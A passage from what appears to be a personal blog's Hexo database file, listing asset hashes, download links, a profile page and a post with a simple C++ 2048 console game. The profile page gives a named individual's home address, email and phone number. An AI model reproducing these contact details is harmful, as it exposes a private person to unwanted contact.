ed":1466012895606},{"_id":"public/image/20150203202458.png","hash":"646d961930a4c80218636f5e8a9300afa8631b83","modified":1466012895607},{"_id":"public/image/20150203204252.png","hash":"60d7d840a06c79ddf6c0d46279a124607c4022f1","modified":1466012895607},{"_id":"public/image/20150203204253.png","hash":"60d7d840a06c79ddf6c0d46279a124607c4022f1","modified":1466012895607},{"_id":"public/image/20150203204412.png","hash":"5cdc76798b192f1f5a07030e553726785dbf0fc5","modified":1466012895607},{"_id":"public/image/20150203204711.png","hash":"bed86f57d31c7bffc87bf9185049a4bc4cd640e3","modified":1466012895607},{"_id":"public/image/20150203205237.png","hash":"5657603a7669de890cd6583b50ad293721c56bcc","modified":1466012895607},{"_id":"public/image/20150203212252.png","hash":"5a069109118e6b90301d1383ee959a1017497d27","modified":1466012895608},{"_id":"public/image/20150209005007.png","hash":"6894712f50e39285d8f5a47b0bffa1a3cf033828","modified":1466012895608},{"_id":"public/image/20150209005837.png","hash":"44698a7cf27591780cbe20d0801847aa9b84adba","modified":1466012895608},{"_id":"public/image/20150209005849.png","hash":"1fe836a5d0ff09ba4886fde45cbfbc867447a04f","modified":1466012895608},{"_id":"public/image/20150223234503.png","hash":"9989b9994495c4ff6446648b96b1b2c5e7e8a244","modified":1466012895608},{"_id":"public/image/20150224.png","hash":"b8b175b96657fcaf716de2e6ef15d94637095480","modified":1466012895609},{"_id":"public/image/20150323132423.png","hash":"f7f191e7c6d677e8638ef07b7bd526cce1324280","modified":1466012895609},{"_id":"public/image/20150405234149.png","hash":"1e1ea16b88d449d7dbd4264fab4cb83fed966f24","modified":1466012895609},{"_id":"public/image/20150607154352.png","hash":"f0e9e2e276116cef0c2952ee9bcdd185c7aa2117","modified":1466012895609},{"_id":"public/image/20151005.jpg","hash":"e9321cda0bba22cc0ea1c99ef09cfcc1f1115d83","modified":1466012895609},{"_id":"public/image/201510171.png","hash":"cbff599c2369c559a078c73a167141302ecd8f64","modified":1466012895610},{"_id":"public/image/201510172.png","hash":"9418c2fdb42418d841ba335615e751d8d05bff90","modified":1466012895610},{"_id":"public/image/201510173.png","hash":"441418d085971ba00f9f57992edeac78f9aa8944","modified":1466012895610},{"_id":"public/image/201510174.png","hash":"54c2da95ef41cfcfcd83a1990c4407106692319f","modified":1466012895610},{"_id":"public/image/20151017design.jpg","hash":"f07cc46b6e2165866893367bfd765cfbfd87ddaf","modified":1466012895610},{"_id":"public/image/20151020195930.jpg","hash":"24d9f54e4627be2244719968248d3d8036b26ccf","modified":1466012895610},{"_id":"public/image/Protocol state fuzzing_summary.pdf","hash":"594bfd34dd386d6e86fe29afbdbcd1b7c991819f","modified":1466012895611},{"_id":"public/image/avatar.jpg","hash":"c534c991ab5fdbb06af36c86fa92d302dba305a9","modified":1466012895611},{"_id":"public/other/48.txt","hash":"b919cd717bb1a57ad899ce0de94e15bdda7762d0","modified":1466012895611},{"_id":"public/other/aco_input.txt","hash":"70dd03f64d26e7b016d86297c627a0dfba89d71b","modified":1466012895611},{"_id":"public/other/ant.cpp","hash":"db1c08b72f5342b82671187ee70d5111fdf5bffc","modified":1466012895612},{"_id":"public/store/difussion.cpp","hash":"a3dbcf98f0cedee372f9074d30f021511b1ba5fc","modified":1466012895612},{"_id":"public/apple-touch-icon.png","hash":"c0fda117fa166d63b9eb690cc5e4fb2caaf493b3","modified":1466012895612},{"_id":"public/download/projects/minesweeper.tar.gz","hash":"1f502da04be344698f57660c5f6c6003975eee7c","modified":1466012895613},{"_id":"public/download/projects/zyj.zip","hash":"afd0021a9a2a6971111aaa82b0408d3b4cfc3515","modified":1466012895614},{"_id":"public/image/Stackoverflow/1.png","hash":"bed0eeb38a13895a3ab3e64411634a099903c5e9","modified":1466012895614},{"_id":"public/image/Stackoverflow/2.png","hash":"1bb59d2fb53abff7ea622d0acf60966ecadfc69a","modified":1466012895615},{"_id":"public/image/Stackoverflow/4.png","hash":"5842a668c40c6744f22c8017e75493c660600ac9","modified":1466012895616},{"_id":"public/image/Stackoverflow/6.png","hash":"c974e417e1d230d21cba64d7012c6bce9fa38827","modified":1466012895616},{"_id":"public/image/Stackoverflow/7.png","hash":"b5da1dab262287f71bb33619d29c700ad16453df","modified":1466012895616},{"_id":"public/image/Stackoverflow/8.png","hash":"02c79d4f147310b18f6cc3b418d5b7472be6ddd2","modified":1466012895616},{"_id":"public/image/Stackoverflow/9.png","hash":"eb300ae4de9de193d997193192682c2b4d810746","modified":1466012895616},{"_id":"public/image/machine_fingerprinting/Susan_with_anti.png","hash":"1fe17cd7969892d3163d508718e4666d980264e1","modified":1466012895616},{"_id":"public/image/machine_fingerprinting/Susan_without_anti.png","hash":"055b95a8fef860c6a7c88c6b0113f89af9ab6fec","modified":1466012895617},{"_id":"public/image/machine_fingerprinting/all_in_one.png","hash":"917f8b3438f0611ca63321c1f37d09b5267e54fc","modified":1466012895617},{"_id":"public/image/machine_fingerprinting/anti_subtract1.png","hash":"c9c6062e3f853479ef614e6b4450f4347763cca7","modified":1466012895617},{"_id":"public/image/machine_fingerprinting/anti_subtract2.png","hash":"ba0c14bc2683e26725ef38d5be70b71b358e2eb7","modified":1466012895617},{"_id":"public/image/machine_fingerprinting/cube_point_to_all.png","hash":"0e5ecc011304b0812e1127c9c180f01adde08bd0","modified":1466012895618},{"_id":"public/image/machine_fingerprinting/cube_power.png","hash":"4b9e813629663a2efbb83bf6566d89907a397fad","modified":1466012895618},{"_id":"public/image/machine_fingerprinting/curve_white_to_no_white.png","hash":"33a402309698c0f08adb7c0835e84fad5b6042d5","modified":1466012895618},{"_id":"public/image/machine_fingerprinting/edge.png","hash":"7f6c929e6a1d7e36245e240f7fe8d0532fcb845e","modified":1466012895618},{"_id":"public/image/machine_fingerprinting/edge_thicker.png","hash":"e158b958a50ac8eed6d3a6c0920b75fbd08b0159","modified":1466012895618},{"_id":"public/image/machine_fingerprinting/origin.png","hash":"af3ca5ee1ef7c5d3356a4238908a946ab63bf2fb","modified":1466012895619},{"_id":"public/image/machine_fingerprinting/origin_compare_anti.png","hash":"8900c174162624cb8623f6b189403d65661ae36f","modified":1466012895619},{"_id":"public/image/machine_fingerprinting/result.png","hash":"ff6946947ea41bc3ff2d3fb55c72891880af58ab","modified":1466012895619},{"_id":"public/image/machine_fingerprinting/susan_point_to_all.png","hash":"6b7b4b477601393823022da4b5a3b4ca6571cb6b","modified":1466012895620},{"_id":"public/image/machine_fingerprinting/susan_power.png","hash":"1328bbf75a1cfdea41c7429b4704adae236abc1b","modified":1466012895620},{"_id":"public/image/machine_fingerprinting/transparent.png","hash":"3c83d89e9a55601bc09341debc6f91902cb4e73d","modified":1466012895620},{"_id":"public/background/bg-1.jpg","hash":"31d7bb15211000c05656899302f8ec9ee3de0e9f","modified":1466012895620},{"_id":"public/background/bg-2.jpg","hash":"d1e0b92e8fa822e44d185b5e1bf94ab47bc98a0a","modified":1466012895620},{"_id":"public/background/bg-3.jpg","hash":"7ae358f3ab8b41558444053400e796c41b3ba0e2","modified":1466012895620},{"_id":"public/background/bg-4.jpg","hash":"9a5241de4c880f13a278f6980bf11d4dfb214d82","modified":1466012895621},{"_id":"public/background/bg-5.jpg","hash":"d476909f06fe8267c676952e3582bf9e9ff73585","modified":1466012895621},{"_id":"public/background/bg-6.jpg","hash":"6df1383d0f6134016d844df9abb740a6e0c0b2c5","modified":1466012895621},{"_id":"public/background/bg-7.jpg","hash":"1a06d3a660bfb99b62d760e4e1e09de168a4c74c","modified":1466012895621},{"_id":"public/background/bg-8.jpg","hash":"8e80d0b7786c3bf7b9648c0190719e78001e9eeb","modified":1466012895621},{"_id":"public/fancybox/blank.gif","hash":"2daeaa8b5f19f0bc209d976c02bd6acb51b00b0a","modified":1466012895622},{"_id":"public/fancybox/fancybox_loading.gif","hash":"1a755fb2599f3a313cc6cfdb14df043f8c14a99c","modified":1466012895622},{"_id":"public/fancybox/fancybox_loading@2x.gif","hash":"273b123496a42ba45c3416adb027cd99745058b0","modified":1466012895622},{"_id":"public/fancybox/fancybox_overlay.png","hash":"b3a4ee645ba494f52840ef8412015ba0f465dbe0","modified":1466012895622},{"_id":"public/fancybox/fancybox_sprite.png","hash":"17df19f97628e77be09c352bf27425faea248251","modified":1466012895622},{"_id":"public/fancybox/fancybox_sprite@2x.png","hash":"30c58913f327e28f466a00f4c1ac8001b560aed8","modified":1466012895623},{"_id":"public/img/GitHub.png","hash":"08c955a91b6733bd51913b54c69fe742d546d0ec","modified":1466012895623},{"_id":"public/img/SegmentFault.png","hash":"52bd4ddf6df129b6958398b21fa370f17cadb428","modified":1466012895623},{"_id":"public/img/TiddlyWiki.png","hash":"58be3c981c6d25b47ddaab2f254838f9baa01d59","modified":1466012895623},{"_id":"public/img/V2EX.png","hash":"9adab6af95db9318e980c01cadbc5de800b4c816","modified":1466012895623},{"_id":"public/img/avatar.png","hash":"c0fda117fa166d63b9eb690cc5e4fb2caaf493b3","modified":1466012895623},{"_id":"public/img/img-err.png","hash":"23a63ea26eb3c1d5e677d9883cf36cc1a1a1228b","modified":1466012895624},{"_id":"public/img/img-loading.png","hash":"a9cd5cd11866824f31e3d1c5e23badfeb3f73031","modified":1466012895624},{"_id":"public/img/scrollbar_arrow.png","hash":"d64a33c4ddfbdb89deeb6f4e3d36eb84dc4777c0","modified":1466012895624},{"_id":"public/img/新浪微博.png","hash":"c9fb558158f491104fd8dbafc92c30591ad0299e","modified":1466012895624},{"_id":"public/img/知乎.png","hash":"50e43bad8fefb3950b13dc86aaa86de8a79432ae","modified":1466012895624},{"_id":"public/img/简书.png","hash":"bfe5e7b6146de19d180f36fa5a2b074c2bc23406","modified":1466012895625},{"_id":"public/img/网易云音乐.png","hash":"8bc2a2e2c4312ee9d4879b24f9e2bd51e6436840","modified":1466012895625},{"_id":"public/img/虾米音乐.png","hash":"d3ff836d5d58e10fb30fac1bae0aae34cfe2038f","modified":1466012895625},{"_id":"public/img/豆瓣.png","hash":"9f4798298548727052fa6ae809933c9e8ac42571","modified":1466012895625},{"_id":"public/fancybox/helpers/fancybox_buttons.png","hash":"e385b139516c6813dcd64b8fc431c364ceafe5f3","modified":1466012895627},{"_id":"public/download/song_li_resume.pdf","hash":"424811077f4b814be583f153b75570cb90af2ca3","modified":1466012895635},{"_id":"public/image/20150203202510.png","hash":"280685cde2c0dbc1957e5e90fd683ba1598208ed","modified":1466012895636},{"_id":"public/image/20150203202517.png","hash":"e13c255ba9ae68e79a2115a6ca5109b9eaa492e1","modified":1466012895636},{"_id":"public/image/20150420110405685.jpg","hash":"e959d18a871a56bb40059b07654ef9cf1085aed5","modified":1466012895636},{"_id":"public/image/taobao.png","hash":"2016c481098d77413dbe85793fe4d13e02da4171","modified":1466012895636},{"_id":"public/css/style.css","hash":"ea1d73b8bfbfdca5005c5e466759752e2603565f","modified":1466012896539},{"_id":"public/fancybox/jquery.fancybox.css","hash":"b6aa6692c2e5f8bd74d96827b78570f0c5683c20","modified":1466012896540},{"_id":"public/fancybox/jquery.fancybox.js","hash":"a82597493d75ea989ca586e09173cff332efe41e","modified":1466012896541},{"_id":"public/fancybox/jquery.fancybox.pack.js","hash":"9e0d51ca1dbe66f6c0c7aefd552dc8122e694a6e","modified":1466012896541},{"_id":"public/js/GithubRepoWidget.js","hash":"624e81a3b0e57495b0c0e0b3e056296c6e8ae5df","modified":1466012896542},{"_id":"public/js/clipboard.min.js","hash":"c13b4bb8fee46447284590d2afc0efca0ea3cb7b","modified":1466012896542},{"_id":"public/js/instagram.js","hash":"f19adbcc0dac33536bc6660598059048ec901882","modified":1466012896543},{"_id":"public/js/jquery.lazyload.js","hash":"8e4ad3e17f8e82be311b6b6e87811762e2b2d764","modified":1466012896543},{"_id":"public/js/main.js","hash":"cc3a85baf1d6792e3801bcaa0077c455eb67818c","modified":1466012896543},{"_id":"public/js/mobile.js","hash":"40dab9b195818df57bfac9e379429a4bbf074659","modified":1466012896544},{"_id":"public/js/pc.js","hash":"ff696c259fbdc16d5939367c2f7ea871244d4b7a","modified":1466012896544},{"_id":"public/image/Stackoverflow/5.png","hash":"04966aba4d6e26ca5287b3d5ba7330956b72ed42","modified":1466012896545},{"_id":"public/background/bg-10.jpg","hash":"51b427f07ffc6f2ad97651f23cc16e8f19ed02f9","modified":1466012896545},{"_id":"public/background/bg-9.jpg","hash":"e4a3631b6b0f94ebce30a6f01ecb2b6ed7cfdb0b","modified":1466012896545},{"_id":"public/fancybox/helpers/jquery.fancybox-buttons.css","hash":"1a9d8e5c22b371fcc69d4dbbb823d9c39f04c0c8","modified":1466012896546},{"_id":"public/fancybox/helpers/jquery.fancybox-buttons.js","hash":"dc3645529a4bf72983a39fa34c1eb9146e082019","modified":1466012896546},{"_id":"public/fancybox/helpers/jquery.fancybox-media.js","hash":"294420f9ff20f4e3584d212b0c262a00a96ecdb3","modified":1466012896546},{"_id":"public/fancybox/helpers/jquery.fancybox-thumbs.css","hash":"4ac329c16a5277592fc12a37cca3d72ca4ec292f","modified":1466012896546},{"_id":"public/fancybox/helpers/jquery.fancybox-thumbs.js","hash":"47da1ae5401c24b5c17cc18e2730780f5c1a7a0c","modified":1466012896547},{"_id":"public/font-awesome/css/font-awesome.css","hash":"b488600451227b445414796e9b8550e7c1bd6d29","modified":1466012896547},{"_id":"public/font-awesome/css/font-awesome.min.css","hash":"12d6861075de8e293265ff6ff03b1f3adcb44c76","modified":1466012896547},{"_id":"public/font-awesome/fonts/FontAwesome.otf","hash":"42c179eef588854b5ec151bcf6a3f58aa8b79b11","modified":1466012896548},{"_id":"public/font-awesome/fonts/fontawesome-webfont.eot","hash":"986eed8dca049714e43eeebcb3932741a4bec76d","modified":1466012896548},{"_id":"public/font-awesome/fonts/fontawesome-webfont.woff","hash":"4a313eb93b959cc4154c684b915b0a31ddb68d84","modified":1466012896548},{"_id":"public/font-awesome/fonts/fontawesome-webfont.woff2","hash":"638c652d623280a58144f93e7b552c66d1667a11","modified":1466012896548},{"_id":"public/download/CUDA_performance.tar.gz","hash":"bebe592ffef09ce2f279ea8899f7df26fe1278b1","modified":1466012896562},{"_id":"public/download/Matrix-invert.zip","hash":"5ed5c087dbb0966126f8bb5de6ef37d56f396bc1","modified":1466012896563},{"_id":"public/image/20150203202449.png","hash":"0e30a14ed76d557a7851b73cc48bd3b0a2486ea4","modified":1466012896563},{"_id":"public/image/20150420110404212.jpg","hash":"e77f872bb5bc06672a49b5fe63d445e13f8addeb","modified":1466012896563},{"_id":"public/image/Stackoverflow/3.png","hash":"7e4a98d9b243db7713aeb6ce2f8cbf6ce55a5c49","modified":1466012896567},{"_id":"public/font-awesome/fonts/fontawesome-webfont.ttf","hash":"6484f1af6b485d5096b71b344e67f4164c33dd1f","modified":1466012896568},{"_id":"public/download/Ant.rar","hash":"ef8c39166e6f316bec64432282cdd13bf50b0015","modified":1466012896573},{"_id":"public/download/TabuSearch_Car.rar","hash":"8ef92b9583a1976c4ff2f03ded9eed0f660576d9","modified":1466012896573},{"_id":"public/download/train_GA.rar","hash":"46fd096488ac04dc56603a313f03a7e3a338516b","modified":1466012896574},{"_id":"public/download/sol315_HW3.zip","hash":"957ca2890220166b83753ecef1e7a2557499b6e1","modified":1466012896598},{"_id":"public/font-awesome/fonts/fontawesome-webfont.svg","hash":"b06b5c8f67fd632cdc62a33b62ae4f74194131b3","modified":1466012896599},{"_id":"public/download/train_GA2015#U5e743#U670823#U65e5182310.rar","hash":"d6cd90bf8a3f8490b6aaa5e3fdc4fcdd30319571","modified":1466012896603},{"_id":"public/image/201510175.png","hash":"1f6df870b241b1556e9af9afe12bc657d14b2874","modified":1466012896604},{"_id":"public/image/IMG_7574.jpg","hash":"1326e32621e11cf5dffa9a6773336151a39cba4c","modified":1466012896609},{"_id":"public/download/fingerprint.pptx","hash":"7cd753de50981119235a307f9b919c528b598899","modified":1466012896624},{"_id":"public/image/20151017hand.jpg","hash":"625ec2ca994270c394f82139863c080915380311","modified":1466012896631},{"_id":"public/image/sol315_hw5.zip","hash":"614651f1040b0c7e0a37a793c9619485e50da458","modified":1466012896639},{"_id":"public/download/music/solitude.mp3","hash":"7f595d2f9bd1134d1bc6df5a3da3034a89b8f570","modified":1466012896670}],"Category":[{"name":"Play","_id":"ciph681u80005wypdjd9jk33x"},{"name":"Machine FingerPrinting","_id":"ciph681ue000fwypd3ml0libx"},{"name":"Algorithm","_id":"ciph681uo000swypd0o99szd4"},{"name":"IS","_id":"ciph681v2001fwypduxgn27t8"},{"name":"Notes","_id":"ciph681v8001rwypda80cgxce"},{"name":"Picture","_id":"ciph681vi002awypdvipj0stg"},{"name":"Algorithm_Road to Success","_id":"ciph681vm002jwypdd6wkrvij"},{"name":"Windows","_id":"ciph681vt002rwypdhp80iyyc"}],"Data":[],"Page":[{"title":"Download","date":"2015-02-27T11:54:56.000Z","_content":"[Chart Software](/download/taobao/Chart.exe)\n[CUDA_performance.tar.gz](/download/CUDA_performance.tar.gz)\n[Snapshot.zip](/download/projects/zyj.zip)\n[Simple-Network project download here](/download/sol315_HW3.zip)\n[到发线_GA工程下载](/download/train_GA2015年3月23日182310.rar)\n[车辆配流_aco工程下载](/download/Ant.rar)\n[2048_代码查看](/download/2048.cpp)\n[TabuSearch_Car工程下载](/download/TabuSearch_Car.rar)\n[Stackoverflow工程下载](/download/Stackoverflow.rar)\n","source":"download/index.md","raw":"title: Download\ndate: 2015-02-27 11:54:56\n---\n[Chart Software](/download/taobao/Chart.exe)\n[CUDA_performance.tar.gz](/download/CUDA_performance.tar.gz)\n[Snapshot.zip](/download/projects/zyj.zip)\n[Simple-Network project download here](/download/sol315_HW3.zip)\n[到发线_GA工程下载](/download/train_GA2015年3月23日182310.rar)\n[车辆配流_aco工程下载](/download/Ant.rar)\n[2048_代码查看](/download/2048.cpp)\n[TabuSearch_Car工程下载](/download/TabuSearch_Car.rar)\n[Stackoverflow工程下载](/download/Stackoverflow.rar)\n","updated":"2016-06-08T20:21:15.000Z","path":"download/index.html","comments":1,"layout":"page","_id":"ciph681vx0030wypd2qt3r1go","content":"<p><a href=\"/download/taobao/Chart.exe\">Chart Software</a><br><a href=\"/download/CUDA_performance.tar.gz\">CUDA_performance.tar.gz</a><br><a href=\"/download/projects/zyj.zip\">Snapshot.zip</a><br><a href=\"/download/sol315_HW3.zip\">Simple-Network project download here</a><br><a href=\"/download/train_GA2015年3月23日182310.rar\">到发线_GA工程下载</a><br><a href=\"/download/Ant.rar\">车辆配流_aco工程下载</a><br><a href=\"/download/2048.cpp\">2048_代码查看</a><br><a href=\"/download/TabuSearch_Car.rar\">TabuSearch_Car工程下载</a><br><a href=\"/download/Stackoverflow.rar\">Stackoverflow工程下载</a></p>\n","excerpt":"","more":"<p><a href=\"/download/taobao/Chart.exe\">Chart Software</a><br><a href=\"/download/CUDA_performance.tar.gz\">CUDA_performance.tar.gz</a><br><a href=\"/download/projects/zyj.zip\">Snapshot.zip</a><br><a href=\"/download/sol315_HW3.zip\">Simple-Network project download here</a><br><a href=\"/download/train_GA2015年3月23日182310.rar\">到发线_GA工程下载</a><br><a href=\"/download/Ant.rar\">车辆配流_aco工程下载</a><br><a href=\"/download/2048.cpp\">2048_代码查看</a><br><a href=\"/download/TabuSearch_Car.rar\">TabuSearch_Car工程下载</a><br><a href=\"/download/Stackoverflow.rar\">Stackoverflow工程下载</a></p>\n"},{"_content":"# Song Li #\n## The World Is Waiting For You ##\n*Address: 418 Summit St. Bethlehem PA*\n*Info: lisong1013@gmail.com, (484) 935-1501*\n\n{% pdf https://drive.google.com/file/d/0B4s900Byvv1ibHRCVDc5cUhVLUU/preview %}\n","source":"profile/index.md","raw":"# Song Li #\n## The World Is Waiting For You ##\n*Address: 418 Summit St. Bethlehem PA*\n*Info: lisong1013@gmail.com, (484) 935-1501*\n\n{% pdf https://drive.google.com/file/d/0B4s900Byvv1ibHRCVDc5cUhVLUU/preview %}\n","date":"2016-06-08T20:21:15.000Z","updated":"2016-06-08T20:21:15.000Z","path":"profile/index.html","title":"","comments":1,"layout":"page","_id":"ciph681vz0031wypdtftewpfu","content":"<h1 id=\"Song-Li\"><a href=\"#Song-Li\" class=\"headerlink\" title=\"Song Li\"></a>Song Li</h1><h2 id=\"The-World-Is-Waiting-For-You\"><a href=\"#The-World-Is-Waiting-For-You\" class=\"headerlink\" title=\"The World Is Waiting For You\"></a>The World Is Waiting For You</h2><p><em>Address: 418 Summit St. Bethlehem PA</em><br><em>Info: lisong1013@gmail.com, (484) 935-1501</em></p>\n\n\n\t<div class=\"row\">\n\t\t<iframe src=\"https://drive.google.com/file/d/0B4s900Byvv1ibHRCVDc5cUhVLUU/preview\" style=\"width:100%; height:550px\"></iframe>\n\t</div>\n\n\n\n","excerpt":"","more":"<h1 id=\"Song-Li\"><a href=\"#Song-Li\" class=\"headerlink\" title=\"Song Li\"></a>Song Li</h1><h2 id=\"The-World-Is-Waiting-For-You\"><a href=\"#The-World-Is-Waiting-For-You\" class=\"headerlink\" title=\"The World Is Waiting For You\"></a>The World Is Waiting For You</h2><p><em>Address: 418 Summit St. Bethlehem PA</em><br><em>Info: lisong1013@gmail.com, (484) 935-1501</em></p>\n\n\n\t<div class=\"row\">\n\t\t<iframe src=\"https://drive.google.com/file/d/0B4s900Byvv1ibHRCVDc5cUhVLUU/preview\" style=\"width:100%; height:550px\"></iframe>\n\t</div>\n\n\n\n"},{"title":"tags","date":"2016-04-14T19:23:12.000Z","_content":"","source":"tags/index.md","raw":"title: tags\ndate: 2016-04-14 19:23:12\n---\n","updated":"2016-06-08T20:21:15.000Z","path":"tags/index.html","comments":1,"layout":"page","_id":"ciph681w00032wypdauyhxkr0","content":"","excerpt":"","more":""}],"Post":[{"title":"2016_4_26","date":"2016-04-26T19:50:47.000Z","_content":"Make edge thicker\n<!--more-->\n## Origin ##\n![](/image/machine_fingerprinting/origin.png)\n## Edge ##\n![](/image/machine_fingerprinting/edge.png)\n## Edge_thicker ##\n![](/image/machine_fingerprinting/edge_thicker.png)\n","source":"_posts/2016-4-26.md","raw":"---\ntitle: '2016_4_26'\ndate: 2016-04-26 19:50:47\ntags: Machine Fingerprinting\n---\nMake edge thicker\n<!--more-->\n## Origin ##\n![](/image/machine_fingerprinting/origin.png)\n## Edge ##\n![](/image/machine_fingerprinting/edge.png)\n## Edge_thicker ##\n![](/image/machine_fingerprinting/edge_thicker.png)\n","slug":"2016-4-26","published":1,"updated":"2016-06-08T20:21:15.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ciph681ty0000wypdht5h5yri","content":"<p>Make edge thicker<br><a id=\"more\"></a></p>\n<h2 id=\"Origin\"><a href=\"#Origin\" class=\"headerlink\" title=\"Origin\"></a>Origin</h2><p><img src=\"/image/machine_fingerprinting/origin.png\" alt=\"\"></p>\n<h2 id=\"Edge\"><a href=\"#Edge\" class=\"headerlink\" title=\"Edge\"></a>Edge</h2><p><img src=\"/image/machine_fingerprinting/edge.png\" alt=\"\"></p>\n<h2 id=\"Edge-thicker\"><a href=\"#Edge-thicker\" class=\"headerlink\" title=\"Edge_thicker\"></a>Edge_thicker</h2><p><img src=\"/image/machine_fingerprinting/edge_thicker.png\" alt=\"\"></p>\n","excerpt":"<p>Make edge thicker<br>","more":"</p>\n<h2 id=\"Origin\"><a href=\"#Origin\" class=\"headerlink\" title=\"Origin\"></a>Origin</h2><p><img src=\"/image/machine_fingerprinting/origin.png\" alt=\"\"></p>\n<h2 id=\"Edge\"><a href=\"#Edge\" class=\"headerlink\" title=\"Edge\"></a>Edge</h2><p><img src=\"/image/machine_fingerprinting/edge.png\" alt=\"\"></p>\n<h2 id=\"Edge-thicker\"><a href=\"#Edge-thicker\" class=\"headerlink\" title=\"Edge_thicker\"></a>Edge_thicker</h2><p><img src=\"/image/machine_fingerprinting/edge_thicker.png\" alt=\"\"></p>"},{"title":"2048","date":"2015-03-06T11:28:24.000Z","_content":"俗气的2048\n<!--more-->\n**新手教学向，没有任何优化和程序设计在里边**\n整个程序设计是这样的。首先读入文件。然后用execute()函数控制整个运算流程。按键按下后，首先调用trans()函数把所有的字符向该方向移动紧密，然后调用addup()函数把临近相同的处理掉，然后调用trans()函数把处理后的向同一个方向移动。\ninit()函数是这样的，如果type是1，那么在判定是不是可以继续游戏之后要在是0的位置随机生成2，如果type是0，那么直判定是不是可以继续。\ninit()其中的随机生成写的比较难懂，可以仔细分析一下就不难明白了。\n```\n#include <stdlib.h>\n#include <string.h>\n#include <time.h>\n#include <iostream>\n#include <fstream>\n#define NUM 4\n\nusing namespace std;\n\n/*****************************\n * output the Map\n *****************************/\n\nvoid output(int Map[NUM][NUM]){\n    int i,j;\n    for(i = 0;i < NUM;++ i){\n        for(j = 0;j < NUM;++ j){\n            cout << Map[i][j] << '\\t';\n        }\n        cout << endl;\n    }\n}\n\n/********************************************\n * Transfer every cell to the right direction\n * @para Map:The Map\n *       type: The direction\n ********************************************/\nvoid trans(int Map[NUM][NUM], char type){\n    int i,j,k;\n    if(type == 'w'){\n        for(i = 0;i < NUM - 1;++ i){\n            for(j = 0;j < NUM;++ j){\n                if(!Map[i][j]) {\n                    for(k = i + 1;k < NUM;++ k){\n                        if(Map[k][j]){\n                            Map[i][j] = Map[k][j];\n                            Map[k][j] = 0;\n                            k = NUM;\n                        }\n                    }\n                }\n            }\n        }\n    }\n    if(type == 'd'){\n        for(i = 0;i < NUM;++ i){\n            for(j = NUM - 1;j > 0;-- j){\n                for(k = j - 1;k >= 0;-- k){\n                    if(!Map[i][j]){\n                        if(Map[i][k]){\n                            Map[i][j] = Map[i][k];\n                            Map[i][k] = 0;\n                            k = -1;\n                        }\n                    }\n                }\n            }\n        }\n    }\n    if(type == 's'){\n        for(i = NUM - 1;i > 0;-- i){\n            for(j = 0;j < NUM;++ j)\n                if(!Map[i][j]) {\n                    for(k = i - 1;k >= 0;-- k){\n                        if(Map[k][j]){\n                            Map[i][j] = Map[k][j];\n                            Map[k][j] = 0;\n                            k = -1;\n                        }\n                    }\n                }\n        }\n    }\n    if(type == 'a'){\n        for(i = 0;i < NUM;++ i){\n            for(j = 0;j < NUM - 1;++ j)\n                if(!Map[i][j]){\n                    for(k = j + 1;k < NUM;++ k){\n                        if(Map[i][k]){\n                            Map[i][j] = Map[i][k];\n                            Map[i][k] = 0;\n                            k = NUM;\n                        }\n                    }\n                }\n        }\n    }\n}\n\n/********************************************\n * get new cell\n * @para Map:The Map\n *       type:\n *            1 : check the Map and add a new cell\n *            0 : only check the Map\n ********************************************/\nbool init(int Map[NUM][NUM], int type){\n    int flag[NUM * NUM];\n    memset(flag,0,sizeof(flag));\n    int i,j,cnt = 0;\n    for(i = 0;i < NUM;++ i){\n        for(j = 0;j < NUM;++ j){\n            if(!Map[i][j]) flag[cnt ++] = i * 4 + j;\n        }\n    }\n    if(!type) return cnt;\n    if(cnt){\n        int rnd = rand() % cnt;\n        rnd = flag[rnd];\n        Map[rnd / 4][rnd % 4] = 2;\n        return true;\n    }\n    return false;\n}\n\n/********************************************\n * if a cell is equal to the next one, add up them\n * @para Map:The Map\n *       type: the direction\n ********************************************/\n\nvoid addup(int Map[NUM][NUM],char type){\n    int i,j,dir;\n    if(type == 'a'){\n        for(i = 0;i < NUM;++ i){\n            for(j = 0;j < NUM - 1;++ j){\n                if(Map[i][j] == Map[i][j + 1]){\n                    Map[i][j] <<= 1;\n                    Map[i][j + 1] = 0;\n                }\n            }\n        }\n    }else if(type == 'w'){\n        for(i = 0;i < NUM - 1;++ i){\n            for(j = 0;j < NUM;++ j){\n                if(Map[i][j] == Map[i + 1][j]){\n                    Map[i][j] <<= 1;\n                    Map[i + 1][j] = 0;\n                }\n            }\n        }\n    }else if(type == 'd'){\n        for(i = NUM - 1;i >= 0;-- i){\n            for(j = NUM - 1;j > 0;-- j){\n                if(Map[i][j] == Map[i][j - 1]){\n                    Map[i][j] <<= 1;\n                    Map[i][j - 1] = 0;\n                }\n            }\n        }\n    }else if(type == 's'){\n        for(i = NUM - 1;i > 0;-- i){\n            for(j = NUM - 1;j >= 0;-- j){\n                if(Map[i][j] == Map[i - 1][j]){\n                    Map[i][j] <<= 1;\n                    Map[i - 1][j] = 0;\n                }\n            }\n        }\n    }\n}\n\nbool execute(int Map[NUM][NUM],char type){\n    int i,j,k;\n    if(type != 'w' && type != 's' && type != 'a' && type != 'd'){\n        if(type == 10) ;\n        else printf(\"Input error\\n\");\n        return true;\n    }\n\n    trans(Map,type);\n\n    addup(Map,type);\n\n    trans(Map,type);\n\n    if(init(Map,1)){\n        output(Map);\n        return true;\n    }\n    output(Map);\n    printf(\"Game over\\n\");\n    return false;\n}\n\nint main(){\n    int i,j;\n    int Map[NUM][NUM];\n    char inputFile[20];\n    char input;\n    srand((unsigned)time(NULL));\n    cout << \"Please input the path of the configuration file:\" << endl;\n    cin >> inputFile;\n    ifstream file(inputFile);\n    memset(Map,0,NUM * NUM * sizeof(int));\n    if(file == NULL){\n        Map[NUM - 1][NUM - 1] = 2;\n        cout << \"Configuration file not found, the map are initialed as the default one\" << endl;\n        output(Map);\n    }else{\n        for(i = 0;i < 4;++ i)\n            for(j = 0;j < 4;++ j)\n                file >> Map[i][j];\n        if(!init(Map,0)) {\n            output(Map);\n            cout << \"Game over!\" << endl;\n            return 0;\n        }\n        cout << \"The map are initialed\" << endl;\n        output(Map);\n    }\n    do{\n        cin >> input;\n    }while(execute(Map,input));\n\n     return 0;\n}\n\n```","source":"_posts/2048.md","raw":"title: \"2048\"\ndate: 2015-03-06 11:28:24\ntags: Play\ncategories: 